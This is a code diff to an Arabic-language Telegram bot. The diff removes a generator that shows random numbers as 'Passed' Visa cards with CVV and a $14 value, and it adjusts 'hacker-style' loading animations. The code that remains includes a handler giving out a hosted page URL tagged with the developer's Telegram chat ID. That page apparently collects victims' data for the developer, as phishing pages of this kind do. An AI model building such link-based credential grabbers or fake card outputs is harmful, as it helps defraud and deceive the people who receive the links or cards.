@@ -54,9 +54,6 @@ def main_menu():
         InlineKeyboardButton("بوت آخر 🤖", url="https://t.me/ALMNHRF_Toobot"),
         InlineKeyboardButton("تواصل مع المطور ☎️", callback_data="contact_dev")
     )
-    kb.add(
-        InlineKeyboardButton("كروت فيزا 💳", callback_data="generate_card")  # الزر الجديد
-    )
     return kb
 
 def back_btn():
@@ -64,7 +61,7 @@ def back_btn():
     kb.add(InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="home"))
     return kb
 
-# ---------------- بداية ----------------
+# ---------------- البداية ----------------
 @dp.message_handler(commands=["start"])
 async def start(message: types.Message):
     await message.answer("🏠 القائمة الرئيسية", reply_markup=main_menu())
@@ -92,9 +89,7 @@ async def send_number(callback: types.CallbackQuery):
     name, code = countries[key]
 
     msg = await callback.message.edit_text("⏳ جاري انشاء الرقم...")
-    
-    # شريط تحميل ستايل هاكر
-    hacker_bar = ["💀▒▓█", "▓█💀▒", "█💀▒▓", "▒💀▓█"]
+    hacker_bar = ["░▒▓█","▒▓█░","▓█░▒","█░▒▓"]
     for p in hacker_bar*3:
         await asyncio.sleep(0.3)
         await msg.edit_text(f"⏳ إنشاء الرقم:\n{p}")
@@ -148,7 +143,7 @@ def generate_user():
 @dp.callback_query_handler(lambda c: c.data == "vip")
 async def vip(callback: types.CallbackQuery):
     msg = await callback.message.edit_text("⏳ جاري التوليد...")
-    hacker_bar = ["💀▒▓█", "▓█💀▒", "█💀▒▓", "▒💀▓█"]
+    hacker_bar = ["░▒▓█","▒▓█░","▓█░▒","█░▒▓"]
     for p in hacker_bar*3:
         await asyncio.sleep(0.3)
         await msg.edit_text(f"⏳ جاري التوليد:\n{p}")
@@ -178,6 +173,7 @@ async def handle_links(message: types.Message):
             await msg.edit_text(f"⏳ جاري الفحص... {bar}")
         await msg.delete()
 
+        # ---------------- تحديد نوع الرابط ----------------
         if "wa.me" in link or "api.whatsapp.com" in link:
             link_type = "واتساب"
         elif "t.me" in link:
@@ -187,6 +183,7 @@ async def handle_links(message: types.Message):
         else:
             link_type = "غير معروف"
 
+        # ---------------- النتيجة الاحترافية ----------------
         result_text = f"""
 • الرابط: {link}
 
@@ -212,6 +209,9 @@ async def whatsapp_link(callback: types.CallbackQuery):
 async def facebook_link(callback: types.CallbackQuery):
     await callback.message.answer("https://oysb.vercel.app/n.html?chatId=7771042305")
 
+# ---------------- بوت آخر ----------------
+# الزرار موجود بالفعل في main_menu مع الرابط بدون سهم
+
 # ---------------- تواصل مع المطور ----------------
 DEV_ID = 7771042305
 
@@ -223,35 +223,6 @@ async def contact_dev(callback: types.CallbackQuery):
 async def forward_to_dev(message: types.Message):
     if message.from_user.id != DEV_ID:
         await bot.send_message(DEV_ID, f"💬 رسالة من {message.from_user.first_name} ({message.from_user.id}):\n{message.text}")
-
-# ---------------- توليد فيز تجريبية ----------------
-def generate_card():
-    number = "".join(str(random.randint(0,9)) for _ in range(16))
-    month = random.randint(1,12)
-    year = random.randint(2026,2032)
-    cvv = random.randint(100,999)
-    return f"""
-𝗣𝗮𝘀𝘀𝗲𝗱 ✅
-[-] Card Number : {number}
-[-] Expiry : {month:02d}/{year}
-[-] CVV : {cvv}
-[-] Bank : Test Bank
-[-] Card Type : VISA - DEBIT - TEST
-[-] Country : USA🇺🇸
-[-] Value : $14
-============================
-[-] by : BOT
-"""
-
-@dp.callback_query_handler(lambda c: c.data == "generate_card")
-async def generate_card_handler(callback: types.CallbackQuery):
-    msg = await callback.message.edit_text("⏳ جاري توليد الكروت...")
-    hacker_bar = ["💀▒▓█", "▓█💀▒", "█💀▒▓", "▒💀▓█"]
-    for p in hacker_bar*3:
-        await asyncio.sleep(0.3)
-        await msg.edit_text(f"⏳ توليد الكروت:\n{p}")
-
-    await msg.edit_text(generate_card(), reply_markup=back_btn())
 
 # ---------------- تشغيل ----------------
 if __name__ == "__main__":
